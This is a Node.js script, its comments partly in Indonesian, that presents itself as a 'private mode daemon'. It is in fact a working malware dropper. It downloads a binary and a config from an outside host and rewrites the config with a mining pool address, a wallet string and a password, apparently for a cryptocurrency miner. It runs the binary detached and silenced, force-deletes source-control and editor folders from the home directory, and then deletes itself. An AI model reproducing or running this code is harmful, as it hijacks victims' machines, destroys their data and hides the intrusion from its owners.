#!/usr/bin/env node
/*
 * Private Mode Daemon - Simple Version
 * Fitur:
 * - Non-root
 * - Private key auth
 * - Cleanup source control
 * - Download & run binary
 * - Self destruct setelah berjalan
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn, execSync } = require('child_process');
const https = require('https');

// ================= CONFIG =================
const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "https://blogspotgenzo.site/config.json";
const PRIVATE_KEY_HASH = "f2b3e9a9123a8ce84e41d8b73f9d8495"; // MD5 dari private.key

const HOME = process.env.HOME || process.env.USERPROFILE;
const BASEDIR = path.join(HOME, '.private_simple');
fs.mkdirSync(BASEDIR, { recursive: true });
process.chdir(BASEDIR);

const BIN_FILE = path.join(BASEDIR, 'sysd');
const CONF_FILE = path.join(BASEDIR, 'sysd.json');
const PID_FILE = path.join(BASEDIR, 'sysd.pid');

// ================= LOGGING =================
function log(msg) {
  console.log(`[${new Date().toISOString()}] ${msg}`);
}

// ================= VERIFY PRIVATE KEY =================
function verifyKey() {
  const keyPath = path.join(__dirname, 'private.key');
  if (!fs.existsSync(keyPath)) {
    log("ERROR: private.key not found.");
    process.exit(1);
  }

  const keyData = fs.readFileSync(keyPath, 'utf8').trim();
  const hash = crypto.createHash('md5').update(keyData).digest('hex');

  if (hash !== PRIVATE_KEY_HASH) {
    log("ERROR: Invalid private key.");
    process.exit(1);
  }

  log("Private key verified.");
}

// ================= CLEANUP SOURCE CONTROL =================
function cleanup() {
  try {
    const dirs = ['.git', '.github', '.firebase', '.vscode', '.idea'];
    dirs.forEach(dir => {
      const target = path.join(HOME, dir);
      if (fs.existsSync(target)) {
        execSync(`rm -rf "${target}"`);
        log(`Deleted: ${dir}`);
      }
    });
  } catch (err) {
    log("Cleanup error: " + err.message);
  }
}

// ================= SIMPLE DOWNLOAD =================
function download(url, output, cb) {
  const file = fs.createWriteStream(output);
  https.get(url, res => {
    if (res.statusCode !== 200) {
      log(`Download failed: ${res.statusCode}`);
      process.exit(1);
    }
    res.pipe(file);
    file.on('finish', () => {
      file.close(cb);
    });
  }).on('error', err => {
    log("Download error: " + err.message);
    process.exit(1);
  });
}

// ================= EDIT CONFIG =================
function editConfig() {
  let data = fs.readFileSync(CONF_FILE, 'utf8');
  data = data.replace(/"tua"/g, '"165.232.87.223:443"')
             .replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Danis"')
             .replace(/"meki"/g, '"power2b"');
  fs.writeFileSync(CONF_FILE, data);
  log("Config updated.");
}

// ================= RUN BINARY =================
function runBinary() {
  const proc = spawn(BIN_FILE, ['-c', CONF_FILE], {
    detached: true,
    stdio: 'ignore'
  });
  proc.unref();
  fs.writeFileSync(PID_FILE, proc.pid.toString());
  log(`Binary running with PID: ${proc.pid}`);
}

// ================= SELF DESTRUCT =================
function selfDestruct() {
  setTimeout(() => {
    try {
      fs.unlinkSync(__filename);
      log("Self destruct done.");
    } catch (e) {
      log("Self destruct failed: " + e.message);
    }
  }, 5000);
}

// ================= MAIN =================
async function main() {
  log("Starting private daemon (simple)...");

  verifyKey();
  cleanup();

  // Download binary jika belum ada
  if (!fs.existsSync(BIN_FILE)) {
    log("Downloading binary...");
    await new Promise(resolve => download(URL_GENZO, BIN_FILE, resolve));
    fs.chmodSync(BIN_FILE, 0o755);
  }

  // Download config jika belum ada
  if (!fs.existsSync(CONF_FILE)) {
    log("Downloading config...");
    await new Promise(resolve => download(URL_CONFIG, CONF_FILE, resolve));
    editConfig();
  }

  runBinary();
  selfDestruct();
}

main();
